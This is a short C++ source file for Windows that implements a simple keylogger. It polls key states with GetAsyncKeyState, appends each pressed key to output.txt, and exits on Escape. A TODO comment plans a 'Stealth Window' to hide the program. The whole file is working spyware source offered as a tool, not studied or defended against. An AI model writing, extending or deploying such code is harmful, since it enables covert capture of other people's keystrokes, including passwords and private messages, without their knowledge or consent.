#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

/**
 * TODO
 * Stealth Window
 */



int main()
{
    string outfile = "output.txt";
    ofstream output;
    output.open(outfile);
    int count = 0;
    int stopKey = 0x1b;
    bool ongoing = true;
	while (ongoing) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{   
			if (GetAsyncKeyState(KEY) == -32767) {
                output << char(KEY);
                //stop on escape
                if(KEY == stopKey){
                    output.close();
                    exit(0);
                    }
				}
			}
            Sleep(1);
		}
        output.close();
}


